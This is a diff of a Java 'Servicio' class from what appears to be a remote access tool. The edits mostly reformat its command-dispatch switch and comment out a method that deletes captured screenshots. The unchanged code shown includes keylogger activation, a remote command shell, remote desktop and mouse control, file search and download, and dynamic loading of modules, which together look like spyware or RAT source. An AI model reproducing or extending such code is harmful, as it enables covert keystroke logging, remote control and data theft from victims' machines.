@@ -548,26 +548,25 @@ public class Servicio extends Thread implements Interfaz {
         }
     }
 
-    private void eliminarTodosArchivosOffline() {
-        if (capturadorOffline != null) {
-            try {
-                capturadorOffline.set(3, true);//copiando
-                //archivo capturas pantallas
-                try {
-                    File f = ((File) capturadorOffline.get(6));//la carpeta de descargas
-                    if (f != null && f.exists()) {
-                        for (File ff : f.listFiles()) {
-                            ff.delete();
-                        }
-                    }
-                } catch (Exception e) {
-                }
-            } catch (Exception e) {
-            }
-            capturadorOffline.set(3, false);//copiando
-        }
-    }
-
+//    private void eliminarTodosArchivosOffline() {
+//        if (capturadorOffline != null) {
+//            try {
+//                capturadorOffline.set(3, true);//copiando
+//                //archivo capturas pantallas
+//                try {
+//                    File f = ((File) capturadorOffline.get(6));//la carpeta de descargas
+//                    if (f != null && f.exists()) {
+//                        for (File ff : f.listFiles()) {
+//                            ff.delete();
+//                        }
+//                    }
+//                } catch (Exception e) {
+//                }
+//            } catch (Exception e) {
+//            }
+//            capturadorOffline.set(3, false);//copiando
+//        }
+//    }
     private int activarKeylogger() {
         try {
             if (kl == null) {
@@ -704,11 +703,9 @@ public class Servicio extends Thread implements Interfaz {
                     comando = (Comando) UtilRT.descomprimirObjeto((byte[]) conexion.leerObjeto());
                     switch (comando.getComando()) {
                         case Protocolo.AUTENTICAR:
-
                             if (accionAutenticar != null) {
                                 accionAutenticar.ejecutar();
                             }
-
                             param1 = (String) UtilRT.leerParametro(comando);
                             if (!autenticado) {
                                 try {
@@ -773,16 +770,17 @@ public class Servicio extends Thread implements Interfaz {
                                 }
                                 descargarArchivo(param1, param2, offset);
                                 break;
-                            case Protocolo.BUSCAR_ARCHIVO:
+                            case Protocolo.BUSCAR_ARCHIVO: {
                                 try {
-                                parametros = ((String) UtilRT.leerParametro(comando)).split("#");
-                                buscar = ((Interfaz) new CLRT().loadClass("rt.modulos.archivos.BAR").newInstance());
-                                buscar.instanciar(Servicio.this, parametros[0], parametros[1]);
-                            } catch (Exception ex) {
-                                buscar = null;
-                                Servicio.this.enviarMensaje("ERROR AL BUSCAR:" + ex.getMessage());
+                                    parametros = ((String) UtilRT.leerParametro(comando)).split("#");
+                                    buscar = ((Interfaz) new CLRT().loadClass("rt.modulos.archivos.BAR").newInstance());
+                                    buscar.instanciar(Servicio.this, parametros[0], parametros[1]);
+                                } catch (Exception ex) {
+                                    buscar = null;
+                                    Servicio.this.enviarMensaje("ERROR AL BUSCAR:" + ex.getMessage());
+                                }
+                                break;
                             }
-                            break;
                             case Protocolo.BUSCAR_ARCHIVO_DETENER:
                                 if (buscar != null) {
                                     buscar.ejecutar(1);
@@ -809,51 +807,55 @@ public class Servicio extends Thread implements Interfaz {
                                     enviarComando(Protocolo.COMANDO_SHELL, "\nConsola desactivada. Actívela primero\n");
                                 }
                                 break;
-                            case Protocolo.CONSOLA_ACTIVAR:
+                            case Protocolo.CONSOLA_ACTIVAR: {
                                 try {
-                                if (consola != null) {
-                                    consola.desactivar();
-                                    consola = null;
+                                    if (consola != null) {
+                                        consola.desactivar();
+                                        consola = null;
+                                    }
+                                    consola = new CMD(this);
+                                    consola.activar();
+                                } catch (Exception e) {
                                 }
-                                consola = new CMD(this);
-                                consola.activar();
-                            } catch (Exception e) {
+                                break;
                             }
-                            break;
-                            case Protocolo.CONSOLA_DESACTIVAR:
+                            case Protocolo.CONSOLA_DESACTIVAR: {
                                 try {
-                                if (consola != null) {
-                                    consola.desactivar();
-                                    consola = null;
+                                    if (consola != null) {
+                                        consola.desactivar();
+                                        consola = null;
+                                    }
+                                } catch (Exception e) {
                                 }
-                            } catch (Exception e) {
+                                break;
                             }
-                            break;
-                            case Protocolo.ADMIN_ARCHIVOS_CREAR_CARPETA:
+                            case Protocolo.ADMIN_ARCHIVOS_CREAR_CARPETA: {
                                 try {
-                                param1 = (String) UtilRT.leerParametro(comando, 0);//nomCarpeta
-                                param2 = (String) UtilRT.leerParametro(comando, 1);//rutaAcrear
-                                param2 = UtilRT.procesaNombreCarpeta(param2);
-                                File carpeta = new File(param2, param1);
-                                carpeta.mkdirs();
-                            } catch (Exception e) {
+                                    param1 = (String) UtilRT.leerParametro(comando, 0);//nomCarpeta
+                                    param2 = (String) UtilRT.leerParametro(comando, 1);//rutaAcrear
+                                    param2 = UtilRT.procesaNombreCarpeta(param2);
+                                    File carpeta = new File(param2, param1);
+                                    carpeta.mkdirs();
+                                } catch (Exception e) {
+                                }
+                                break;
                             }
-                            break;
-
-                            case Protocolo.ESCRITORIO_REMOTO_EVENTO:
+                            case Protocolo.ESCRITORIO_REMOTO_EVENTO: {
                                 try {
-                                escritorioRemoto.ejecutar(6, (Object[]) comando.getObjeto());
-                            } catch (Exception e) {
+                                    escritorioRemoto.ejecutar(6, (Object[]) comando.getObjeto());
+                                } catch (Exception e) {
 //                                    //e.printStackTrace();
+                                }
+                                break;
                             }
-                            break;
-                            case Protocolo.ESCRITORIO_REMOTO_MOUSE:
+                            case Protocolo.ESCRITORIO_REMOTO_MOUSE: {
                                 try {
-                                parametros = ((String) UtilRT.leerParametro(comando)).split(":");
-                                escritorioRemoto.ejecutar(2, Float.valueOf(parametros[0]), Float.valueOf(parametros[1]), Integer.valueOf(parametros[3]), Integer.valueOf(parametros[2]), Integer.valueOf(parametros[4]));
-                            } catch (Exception ex) {
+                                    parametros = ((String) UtilRT.leerParametro(comando)).split(":");
+                                    escritorioRemoto.ejecutar(2, Float.valueOf(parametros[0]), Float.valueOf(parametros[1]), Integer.valueOf(parametros[3]), Integer.valueOf(parametros[2]), Integer.valueOf(parametros[4]));
+                                } catch (Exception ex) {
+                                }
+                                break;
                             }
-                            break;
                             case Protocolo.CTRL_ALT_SUPR:
                                 escritorioRemoto.ejecutar(5);
                                 break;
